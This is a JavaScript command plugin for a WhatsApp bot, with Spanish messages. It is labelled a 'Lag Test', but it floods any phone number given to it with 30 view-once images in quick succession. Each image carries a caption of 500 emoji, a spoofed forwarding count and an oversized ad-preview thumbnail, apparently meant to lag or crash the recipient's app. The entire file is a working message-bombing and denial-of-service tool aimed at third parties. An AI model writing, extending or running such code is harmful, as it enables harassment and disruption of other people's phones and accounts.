import fetch from 'node-fetch';

let handler = async (m, { conn, args, usedPrefix, command }) => {
  let number = args[0];

  if (!number || !number.match(/^\d{5,}$/)) {
    return m.reply(`✳️ *Formato incorrecto*\n\n📌 Usa: *${usedPrefix + command} 573001234567*`);
  }

  let jid = number + "@s.whatsapp.net";
  let times = 30;

  m.reply(`📡 *Enviando Lag Test a* ${jid}...\n📨 *Mensajes: ${times}*`);

  // Descargar imagen como buffer
  let res = await fetch("https://telegra.ph/file/94cf0cb2054ff45e3f0df.jpg");
  let buffer = await res.buffer();

  for (let i = 0; i < times; i++) {
    try {
      await conn.sendMessage(jid, {
        image: buffer,
        caption: '🧨'.repeat(500),
        viewOnce: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: ['0@s.whatsapp.net'],
          externalAdReply: {
            title: "🚧 WhatsApp Lag Test 🚧",
            body: "Cargando contenido...",
            thumbnail: buffer,
            sourceUrl: "https://whatsapp.com",
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      });
      await new Promise(res => setTimeout(res, 150));
    } catch (e) {
      console.error(`❌ Error en mensaje ${i + 1}:`, e);
    }
  }

  m.reply("✅ *Lag Test finalizado.*");
};

handler.command = /^lag$/i;
handler.owner = true;
export default handler;